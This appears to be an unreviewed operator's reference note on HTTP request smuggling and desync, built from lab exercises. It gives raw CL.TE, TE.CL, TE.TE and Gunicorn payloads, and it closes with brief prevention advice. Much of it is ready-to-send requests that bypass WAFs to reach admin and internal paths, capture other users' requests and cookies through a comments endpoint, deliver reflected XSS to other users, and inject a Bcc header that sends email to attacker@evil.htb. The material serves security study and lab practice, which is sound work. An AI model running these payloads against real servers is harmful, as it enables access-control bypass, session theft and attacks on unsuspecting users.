---
technique: "Request Smuggling & HTTP Desync"
family: "http-protocol"
severity_hint: "high"
tags: []
source: "_raw/Web attacks/Web Attacks/HTTP Attacks/Request Smuggling & HTTP Desync.md"
source_sha256: "c64a7ad05f5e9b4ed0718cc28d22122116a8839adc0d53521af3386f2f14338b"
curator_version: 2
review_status: imported-unreviewed
---

# Request Smuggling & HTTP Desync

> Family: **http-protocol** · Severity hint: **high** · Tags: —
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: —.

## Quick index — payloads & commands in this note
- `python: POST / HTTP/1.1`
- `python: POST / HTTP/1.1`
- `python: POST / HTTP/1.1`
- `python: 1d\r\nparam1=HelloWorld&param2=Test\r\n0\r\n\r\n`
- `If a message is received with both a Transfer-Encoding header field and a Content-Length h`
- `python: POST /admin.php?promote_uid=2 HTTP/1.1`
- `python: # Frontend | Reverseproxy`
- `python: # Backend`
- `python: POST / HTTP/1.1`
- `python: GET / HTTP/1.1`
- `python: POST / HTTP/1.1`
- `python: POST / HTTP/1.1`
- `python: GET /404 HTTP/1.1`
- `python: Content-Length: 4`
- `python: GET / HTTP/1.1`
- `python: GET / HTTP/1.1`
- `python: Content-Length: 51`
- `python: POST / HTTP/1.1`
- `python: GET / HTTP/1.1`
- `python: POST /comments.php HTTP/1.1`
- `python: POST / HTTP/1.1`
- `python: GET / HTTP/1.1`
- `python: POST / HTTP/1.1`
- `python: GET /comments.php HTTP/1.1`
- `python: echo "GET /ksu3nsj9c HTTP/1.1  Host: localhost:8000  " | wc -c | xargs printf "%x"`
- `python: POST / HTTP/1.1`
- `python: POST / HTTP/1.1`
- `python: POST /doesnotexists HTTP/1.1`
- `python: Hi Admin,`
- `python: GET /doesnotexists HTTP/1.1`

## Playbook (operator notes)

# Request Smuggling & HTTP Desync

- **Tools**
    - https://github.com/defparam/smuggler
    - https://github.com/PortSwigger/http-request-smuggler
        
        [RFC 2616: Hypertext Transfer Protocol -- HTTP/1.1](https://datatracker.ietf.org/doc/html/rfc2616)
        
        [HTTP Desync Attacks: Request Smuggling Reborn](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
        
        [HTTP_Desync](https://kathan19.gitbook.io/howtohunt/http-desync-attack/http_desync)
        

- **HTTP1 Must Die**
    
    https://portswigger.net/kb/papers/dzmxreq/http1-must-die.pdf
    
    Check for discrepancies:
    
    > You can often distinguish between V-H and H-V discrepancies by **paying close attention to the responses, and guessing whether they originated from a front-end or back-end.** Note that the specific **status codes are not relevant**, and can sometimes be confusing. **All that matters is that they're different**. This finding turned out to be a V-H discrepancy.
    > 
    
    
    
    **Visible-Hidden (V-H)**
    
    The masked Host header is **visible to the front-end, but hidden from the backend**
    
    **Hidden-Visible (H-V)**
    
    he masked Host header is **hidden from the front-end, but visible to the backend**
    
    ---
    
    ### Turning a V-H discrepancy into a CL.0 desync
    
    > Given a V-H discrepancy, you could attempt a [TE.CL](http://te.cl/) exploit by hiding the Transfer-Encoding header from the back-end, or try a CL.0 exploit by hiding the Content-Length header. **I highly recommend using CL.0 wherever possible as it's much less likely to get blocked by a WAF**.
    > 
    
    
    
    *Frontend sees the Content-Length header, backend does not. Thus the frontend parses the payload and gives it to the backend. The backend does not see that content as payload, but as a full new HTTP request since there is no delimiter in HTTP.*
    
    On a **different target**, the above **exploit failed** because the **front-end server was rejecting GET requests that contained a body**. I was able to **work around this simply by switching the method to OPTIONS**. It's the ability to spot and work around barriers like this that makes scanning for parser- discrepancies so useful.
    
    ---
    
    ### Detection strategies
    
    By combining different headers, permutations, and strategies, the tool achieves superior coverage. For example, here's a discovery made using the same header (Host), and the same permutation (leading space before header name), but a different strategy (duplicate Host with invalid value)
    
    
    
    ---
    
    ### Exploiting H-V on IIS behind ALB
    
    HTTP Request Smuggler also identified a large number of vulnerable systems using Microsoft IIS behind AWS Application Load Balancer (ALB). This is useful to understand because AWS isn't planning to patch it. The detection typically shows up like:
    
    
    
    As you can infer from the server banners, this is a H-V discrepancy: when the malformed Host header is obfuscated, ALB doesn't see it and passes the request through to the back-end server.
    
    The classic way to exploit a H-V discrepancy is with a CL.TE desync, as the Transfer-Encoding header usually takes precedence over the Content-Length, but this gets blocked by AWS' Desync Guardian10. I decided to shelve the issue to focus on other findings, then Thomas Stacey independently discovered it11, and bypassed Desync Guardian using an H2.TE desync.
    
    Even with the H2.TE bypass fixed, attackers can still exploit this to smuggle headers, enabling IP- spoofing and sometimes complete authentication bypass.
    
    ---
    
    ### Exploiting H-V without Transfer-Encoding
    
    ### 0.CL desync attacks
    
    [0.CL](http://0.cl/) desync attacks are widely regarded as unexploitable. To understand why, consider what happens when you send the following attack to a target with a H-V parser discrepancy:
    
    
    
    The front-end doesn't see the Content-Length header, so it will regard the orange payload as the start of a second request. This means it buffers the orange payload, and only forwards the header- block to the back-end:
    
    
    
    The back end does see the Content-Length header, so it will wait for the body to arrive. Meanwhile, the front-end will wait for the back-end to reply. Eventually, one of the servers will time out and reset the connection, breaking the attack. In essence, [0.CL](http://0.cl/) desync attacks usually result in an upstream connection deadlock.
    
    ### Breaking the [0.CL](http://0.cl/) deadlock
    
    Whenever I tried to use the single-packet attack13 on a static file on a target running nginx, nginxwould break my timing measurement by responding to the request before it was complete. Thisrequired a convoluted workaround at the time, but hinted at a way to make [0.CL](http://0.cl/) exploitable.The key to escaping the [0.CL](http://0.cl/) deadlock is to find an early-response gadget: a way to make theback-end server respond to a request without waiting for the body to arrive. This is straightforwardon nginx, but my target was running IIS, and the static file trick didn't work there. So, how can wepersuade IIS to respond to a request without waiting for the body to arrive? Let's take a look at myfavourite piece of Windows documentation:
    
    
    
    If you try to access a file or folder using a reserved name, the operating system will throw an exception for amusing legacy reasons. We can make a server hit this quirk simply by requesting 'con' inside any folder that's mapped to the filesystem.I found that if I hit /con on the target website, IIS would respond without waiting for the body to arrive, and helpfully leave the connection open. When combined with the CL.0 desync, this would result in it interpreting the start of the second request as the body of the first request, triggering a 400 Bad Request response. Here's the view from the user's perspective:
    
    
    
    
    
    ### Moving beyond 400 Bad Request
    
    To prove you've found a [0.CL](http://0.cl/) desync, the next step is to trigger a controllable response. After the attack request, send a 'victim' request containing a second path nested inside the header block:
    
    
    
    ### Converting [0.CL](http://0.cl/) into CL.0 with a double-desync
    
    …
    

---

- **Info**
    
    This vulnerability occurs when a **desyncronization** between **front-end proxies** and the **back-end server** allows an **attacker** to **send** an HTTP **request** that will be **interpreted** as a **single request** by the **front-end** proxies (load balance/reverse-proxy) and **as 2 request** by the **back-end server**. This allows a user to **modify the next request that arrives to the back-end server after his**.
    
- **TCP Stream of HTTP requests**
    - TCP is stream-oriented
    - Application layer protocol (eg HTTP)
        - Does not know how many TCP packets were transmitted
        - Just receives the raw data from TCP
    - HTTP transmitted using TCP
        - HTTP/1.0 each HTTP request sent over a seperate TCP socket
        - HTTP/1.1 same connection is used to transmit multiple request response pairs
        - When using reverse proxy, socket is usally kept open and is re-used for all requests
    
    
    
    - Multiple HTTP requests are sent subsequently in the same TCP stream
        - Contains all HTTP requests back-to-back as there is no seperator between them
    
    ```python
    POST / HTTP/1.1
    Host: clte.htb
    Content-Length: 5
    
    HELLOGET / HTTP/1.1
    Host: clte.htb
    ```
    
    - Both the reverse proxy and the webserver need to know where the boundaries of these HTTP requests are, to correctly parse them
- **Content-Length vs Transfer-Encoding**
    - HTTP headers to determine the length of the body
        - `Content-Length (CL)`
        - `Transfer-Encoding (TE)`
    
    ### **Content-Length**
    
    - Specifies the byte length of the message body in the CL HTTP header
    
    ```python
    POST / HTTP/1.1
    Host: 127.0.0.1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 29
    
    param1=HelloWorld&param2=Test # <-- 29 Bytes
    ```
    
    ### **Transfer-Encoding**
    
    - Specify a `chunked` encoding, indicating that the request contains multiple chunks of data
    
    ```python
    POST / HTTP/1.1
    Host: 127.0.0.1
    Content-Type: application/x-www-form-urlencoded
    Transfer-Encoding: chunked
    
    1d # <-- Chunk size (29 bytes)
    param1=HelloWorld&param2=Test # <-- Data
    0 # <-- Terminator
    # <-- CRLF (empty line)
    ```
    
    ```python
    1d\r\nparam1=HelloWorld&param2=Test\r\n0\r\n\r\n
    ```
    
    ### Requests that contain TE and CE
    
    ```
    If a message is received with both a Transfer-Encoding header field and a Content-Length header field, the CL MUST be ignored.
    ```
    
- **Desynchronization**
    
    https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
    
    - HTTP requests are viewed in isolation, meaning different HTTP requests cannot influence each other
    - Attackers might be able to influence other users TCP requests with their own
    - When the reverse proxy and web server disagree on the boundaries of an HTTP request, there is a discrepancy at the beginning of the subsequent request
    - This leads to data being left in the TCP stream that one of the two systems treats as a partial HTTP request, while the other system treats it as part of the previous request
    - When the next request arrives, the behavior of the reverse proxy and web server thus differs, leading to potentially serious security issues
    - By sending a specifically crafted request that forces such a disagreement, an attacker would thus be able to manipulate the subsequent request which may come from an entirely different user
    
    
    

---

<aside>
💡

An extra CRLF at the end after payloads is sometimes neccessary, depending on the request:

```python
POST /admin.php?promote_uid=2 HTTP/1.1
Dummy: 
-CRLF- (\r\l)
```

</aside>

---

### CL.TE

- Details
    
    Frontend / Reverseproxy processes CL but BE processes TE
    
    ```python
    # Frontend | Reverseproxy
    POST / HTTP/1.1
    Host: clte.htb
    Content-Length: 52
    Transfer-Encoding: chunked
    
    0
    
    POST /admin.php?promote_uid=2 HTTP/1.1
    Dummy: 
    
    ```
    
    ```python
    # Backend
    POST /admin.php?promote_uid=2 HTTP/1.1
    Dummy: GET / HTTP/1.1
    Host: clte.htb
    Cookie: sess=<admin_session_cookie>
    ```
    

---

### TE.TE

- Details
    
    > *Both the reverse proxy and web server support chunked encoding. However 
    one of the two systems does not act according to the specification such 
    that it is possible to manipulate the TE header in such a way that one 
    of the two systems accepts it and the other one does not, instead 
    falling back to the CL header. Thus, it is possible to obfuscate the TE 
    header such that one of the two systems does not parse it correctly. 
    This type of HTTP request smuggling vulnerability is called `TE.TE` vulnerability. We will discuss how to identify and exploit this type of request smuggling vulnerability.*
    > 
    
    **Note:** The sequences `[\x09]` and `[\x0b]` are not the literal character sequences used in the obfuscation. Rather they denote the horizontal tab character (ASCII `0x09`) and vertical tab character (ASCII `0x0b`).
    
    | Description | Header |
    | --- | --- |
    | Substring match | `Transfer-Encoding: testchunked` |
    | Space in Header name | `Transfer-Encoding : chunked` |
    | Horizontal Tab Separator | `Transfer-Encoding:[\x09]chunked` |
    | Vertical Tab Separator | `Transfer-Encoding:[\x0b]chunked` |
    | Leading space |  `Transfer-Encoding: chunked` |
    | Lowercase | `Transfer-encoding: chunked` |
    
    
    
    > Now let's replace the space that separates the TE header from the `chunked` value with a horizontal tab. We can do so by switching to the `Hex` view in the Repeater Tab and directly editing the space (`0x20`) to a horizontal tab (`0x09`):
    > 
    
    
    
    > *Request became HELLOGET (eg HELLOGET / HTTP1.1) which does not exists*
    > 

---

### TE.CL

- Details
    
    Turn off:
    
    
    
    Create tab group:
    
    
    
    
    
    ```python
    POST / HTTP/1.1
    Host: tecl.htb
    Content-Length: 3
    Transfer-Encoding: chunked
    
    5\r\n
    HELLO\r\n
    0
    
    ```
    
    `HELLO` - Chunk (5 bytes)
    
    `0`  - parsed as the empty chunk, thus signaling that the request body is concluded
    
    The web server uses the CL header to determine the request length. The CL header gives a length of 3 bytes, meaning the request body is parsed as the following 3 bytes:
    `5\r\n`
    
    In particular, the bytes `HELLO\r\n0\r\n\r\n` are not consumed from the TCP stream.This means that the web server thinks this marks the beginning of a new HTTP request
    
    Next request that hits, assume its:
    
    ```python
    GET / HTTP/1.1
    Host: tecl.htb
    ```
    
    ```python
    POST / HTTP/1.1
    Host: tecl.htb
    Content-Length: 3
    Transfer-Encoding: chunked
    
    5
    HELLO
    0
    
    GET / HTTP/1.1
    Host: tecl.htb
    
    ```
    
    Webserver:
    
    ```python
    POST / HTTP/1.1
    Host: tecl.htb
    Content-Length: 3
    Transfer-Encoding: chunked
    
    5
    HELLO
    0
    
    GET / HTTP/1.1
    Host: tecl.htb
    ```
    
    Since the web server thinks the first request ends after the bytes `5\r\n`, the bytes `HELLO\r\n0\r\n\r\n` are prepended to the subsequent request. In this case, the web server 
    will most likely respond with an error message since the bytes `HELLO` are not a valid beginning of an HTTP request
    
    Exploit:
    
    ```python
    GET /404 HTTP/1.1
    Host: tecl.htb
    Content-Length: 4
    Transfer-Encoding: chunked
    
    27
    GET /admin HTTP/1.1
    Host: tecl.htb
    
    0
    
    ```
    
    
    
    The WAF uses the TE header to determine the first request's body length. The first chunk contains `0x27 = 39` bytes. The second chunk is the empty chunk which terminates the request. The WAF thus sees two GET requests to `/404`. Since none of these requests contain the blacklisted keyword `admin` in the URL, the WAF does not block any of the two requests and forwards the bytes via the TCP connection to the web server.
    
    **Identification:**
    
    
    
    
    
    Lab Solution:
    
    ```python
    Content-Length: 4
    Transfer-Encoding: xchunked
    
    2f
    GET /admin HTTP/1.1
    Host: 94.237.49.23:32264
    
    0
    
    ```
    

---

### **Vulnerable Software**

- Details
    
    Gunicorn `20.0.4` contained a bug when encountering the HTTP header `Sec-Websocket-Key1` that fixed the request body to a length of 8 bytes, no matter what value the CL and TE headers are set to. This is a special header used in the establishment of WebSocket connections. Since the reverse proxy does not suffer from this bug, this allows us to create desynchronization between the two systems.
    
    **Tab Group**
    
    ```python
    GET / HTTP/1.1
    Host: gunicorn.htb
    Content-Length: 49
    Sec-Websocket-Key1: x
    
    xxxxxxxxGET /404 HTTP/1.1
    Host: gunicorn.htb
    ```
    
    ```python
    GET / HTTP/1.1
    Host: gunicorn.htb
    ```
    
    
    
    
    
    Lab Solve:
    
    ```python
    Content-Length: 51
    Sec-Websocket-Key1: x
    
    xxxxxxxxGET /admin HTTP/1.1
    Host: gunicorn.htb
    
    ```
    

---

### **Exploitation of Request Smuggling**

- 
    
    **Bypassing Security Checks**
    
    - Blocking an HTTP request if it contains any blacklisted words in the URL, thereby blocking access to certain paths in the web application
    - Only from whitelisted IP addresses
    - Compute a score for each request that estimates how malicious the request is
    
    assume a web application uses a WAF to block all requests to the `/internal/` path that do not come from the internal network of a company, we can easily bypass this using either CL.TE or [TE.CL](http://te.cl/) request smuggling
    
    ```python
    POST / HTTP/1.1
    Host: vuln.htb
    Content-Length: 64
    Transfer-Encoding: chunked
    
    0
    
    POST /internal/index.php HTTP/1.1
    Host: localhost
    Dummy: 
    ```
    
    ```python
    GET / HTTP/1.1
    Host: vuln.htb
    Content-Length: 4
    Transfer-Encoding: chunked
    
    35
    GET /internal/index.php HTTP/1.1
    Host: localhost
    
    0
    ```
    
    ### **Stealing User Data**
    
    We can steal other users' information by forcing them to submit their request parameters to a location we can later access
    
    
    
    ```python
    POST /comments.php HTTP/1.1
    Host: stealingdata.htb
    Content-Length: 43
    Content-Type: application/x-www-form-urlencoded
    
    name=htb-stdnt&comment=Hello+World%21
    ```
    
    **Exploit**
    
    ```python
    POST / HTTP/1.1
    Host: stealingdata.htb
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 154
    Transfer-Encoding: chunked
    
    0
    
    POST /comments.php HTTP/1.1
    Host: stealingdata.htb
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 300
    
    name=hacker&comment=test
    ```
    
    
    
    ### **Mass Exploitation of Reflected XSS**
    
    Similarly to Web Cache Poisoning, HTTP request smuggling vulnerabilities can be used to exploit reflected XSS vulnerabilities without any user interaction that is typically required in reflected XSS scenarios. Furthermore, request smuggling can make otherwise unexploitable 
    scenarios exploitable, for instance, if a web application contains a 
    reflected XSS in the HTTP `Host` header. Since it is usually 
    impossible to force the victim's browser to send a request using a 
    manipulated host header, such an XSS vulnerability would be 
    unexploitable on its own. However, since HTTP request smuggling allows 
    for arbitrary manipulation of other users' requests, such scenarios can 
    be weaponized to target a vast number of potential victims.
    
    ```python
    GET / HTTP/1.1 
    Host: vuln.htb
    Vuln: "><script>alert(1)</script>
    ```
    
    ```python
    POST / HTTP/1.1
    Host: vuln.htb
    Content-Length: 63
    Transfer-Encoding: chunked
    
    0
    
    GET / HTTP/1.1
    Vuln: "><script>alert(1)</script>
    Dummy: 
    ```
    
    Solve Lab:
    
    ```python
    GET /comments.php HTTP/1.1
    Host: 94.237.57.115:43646
    Accept-Language: en-US,en;q=0.9
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate, br
    Connection: keep-alive
    Content-Length: 230
    Transfer-Encoding: chunked
    
    0
    
    POST /comments.php HTTP/1.1
    Host: 94.237.57.115:43646
    Content-Length: 300
    Content-Type: application/x-www-form-urlencoded
    Cookie: PHPSESSID=5vfgic2dfm0au47kbnsk8r5d2r
    
    name=ADMIN&csrf=68ca85e3c71012.59281202&comment=xxx
    ```
    
    where CSRF was gathered and dropped from a comment post request, and the cookie is our own session id, the admins request will be appened to the comment after xxxGET…
    

---

### **Request Smuggling Tools & Prevention**

- Details
    
    **CLI Lenght Calculation**
    
    ```python
    echo "GET /ksu3nsj9c HTTP/1.1  Host: localhost:8000  " | wc -c | xargs printf "%x"
    ```
    
    **Request Smuggler Burp**
    
    Send arbitrary POST request to repeater:
    
    ```python
    POST / HTTP/1.1
    Host: clte.htb
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 17
    
    param1=HelloWorld
    ```
    
    
    
    ```python
    POST / HTTP/1.1
    Host: clte.htb
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 28
    Transfer-Encoding: chunked
    
    11
    param1=HelloWorld
    0
    ```
    
    Additionally, we can use the extension to exploit request smuggling 
    vulnerabilities. As an example, let's consider a setup that is 
    vulnerable to a `CL.TE` attack. We can exploit this using the extension by right-clicking our request formatted in chunked encoding and selecting `Extensions > HTTP Request Smuggler > Smuggle attack (CL.TE)`:
    
    
    
    
    
    Click on the `Attack` button at the bottom of the Turbo 
    Intruder window. Turbo Intruder will now periodically exploit the target
     once every second. After a few seconds, we can click on `Halt` to stop the attack and analyze the requests to determine whether the target is vulnerable.
    
    The first request sent in each iteration is the crafted request that contains the smuggled request to `/admin.php` in its body:
    
    
    
    While the remaining requests in each iteration do not contain the payload. They simulate the victim's request and are sent to trigger the vulnerability:
    
    
    
    When looking at the response length in the table in the upper half of
     the two screenshots, we can see that the second request has a different
     response length. From that, we can conclude that the request smuggling 
    vulnerability was successful. While the first request (and all other 
    requests apart from the second one) have a response length of `4618` as the web server responds with the web application's index, the second response contains `/admin.php`,
     which is the response to our smuggled request. We can therefore 
    conclude that the second request triggered the smuggled request, thus 
    the setup is vulnerable to a `CL.TE` request smuggling vulnerability.
    
    We could also adjust the exploit script to more specifically fit our 
    needs by adding or removing victim requests, adding parameters to the 
    smuggled request, or changing the sleep timer in-between iterations. 
    Additionally, the HTTP request smuggler extension can be used the same 
    way to exploit `TE.CL` vulnerabilities.
    

---

### HTTP Request Smuggling Prevention

- Details
    
    Preventing HTTP request smuggling attacks generally is no easy task, 
    as the issues causing request smuggling vulnerabilities often live 
    within the web server software itself. Thus, it cannot be prevented from
     within the web application. Furthermore, web application developers 
    might be unaware of underlying quirks that exist in the web server which
     might cause HTTP request smuggling vulnerabilities, such that they have
     no chance of preventing them. However, there are some general 
    recommendations we can follow when configuring our deployment setup to 
    ensure that the risk of HTTP request smuggling vulnerabilities is as 
    minimal as possible, or at least the impact is reduced:
    
    - Ensure that web server and reverse proxy software are kept
    up-to-date such that patches for security issues are installed as soon
    as possible
    - Ensure that client-side vulnerabilities that might seem
    unexploitable on their own are still patched, as they might become
    exploitable in an HTTP request smuggling scenario
    - Ensure that the default behavior of the web server is to close TCP
    connections if any exception or error occurs on the web server level
    during request handling or request parsing
    - If possible, configure HTTP/2 usage between the client and web
    server and ensure that lower HTTP versions are disabled. We will discuss in the upcoming sections why this is beneficial

---

### Misc

**Email Header Injection**

```python
POST /doesnotexists HTTP/1.1
Host: 94.237.49.23:52600
Content-Type: application/x-www-form-urlencoded
Content-Length: 224
Transfer-Encoding: xchunked

d5
POST /contact HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

name=hacker%0d%0aBcc:%20attacker@evil.htb%0d%0aDummy:%20abc&email=attacker%40evil.htb&message=ciao

0

```

```python
Hi Admin,

someone sent you a message.
Make sure to check it out on the admin portal:

http://127.0.0.1:8000/ksu3nsj9c

Remember that our WAF blocks all external access to the admin portal and it can only be accessed internally.
```

```python
GET /doesnotexists HTTP/1.1
Host: 94.237.49.23:52600
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: xchunked

2f
GET /ksu3nsj9c HTTP/1.1
Host: localhost:8000

0

```

## Source
Original note: `_raw/Web attacks/Web Attacks/HTTP Attacks/Request Smuggling & HTTP Desync.md`
